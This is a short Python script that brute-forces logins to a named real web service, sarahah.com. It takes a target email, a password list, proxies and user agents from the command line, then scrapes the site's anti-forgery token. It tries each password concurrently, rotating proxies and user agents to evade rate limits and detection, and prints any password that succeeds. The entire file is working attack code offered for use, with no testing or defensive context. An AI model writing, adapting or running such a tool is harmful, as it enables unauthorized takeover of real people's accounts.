import requests,re,_thread,sys,urllib3;urllib3.disable_warnings()
try:
    url="https://www.sarahah.com/account/login"
    usr_agnt=[i.split("\n")[0] for i in open(sys.argv[4])]
    #,'https':'https://'+str(i.split("\n")[0])
    ip = [{'http':'http://'+str(i.split("\n")[0])} for i in open(str(sys.argv[3]))]
    passlist=[i.split("\n")[0] for i in open(str(sys.argv[2]))]
    user=sys.argv[1]
    headers={
        'Host':'www.sarahah.com','User-Agent': "",'Accept': "*/*",'Accept-Language': 'sen-US,en;q=0.5','Accept-Encoding': 'gzip, deflate, br','Referer': url,
        'Content-Type': 'application/x-www-form-urlencoded','Connection': 'keep-alive',
        }
    def brute(pl):
        headers["User-Agent"]=usr_agnt[pl]
        with requests.session() as sessions:
            data={
                "Email":user,"Password":passlist[pl],
                "__RequestVerificationToken":[re.sub('value=|"',"",i) for i in str(sessions.get("https://www.sarahah.com/account/login").text).split() if 'value="' in i][2],
                }
            get=sessions.post(url,data=data,headers=headers,proxies=ip[pl])
            return re.findall("Messages Index",get.text)

    for i in range(len(passlist)):_thread.start_new_thread(print,(passlist[i],sys.exit(passlist[i]+" loggedin") if brute(i) else "\033[91m \033[5m Faild \033[0m"))

except:print("\033[94m"+sys.argv[0].split("\\")[::-1][0]+" [User Name | Email] [Passwords File] [Proxies File] [User-Agent File] \033[0m")
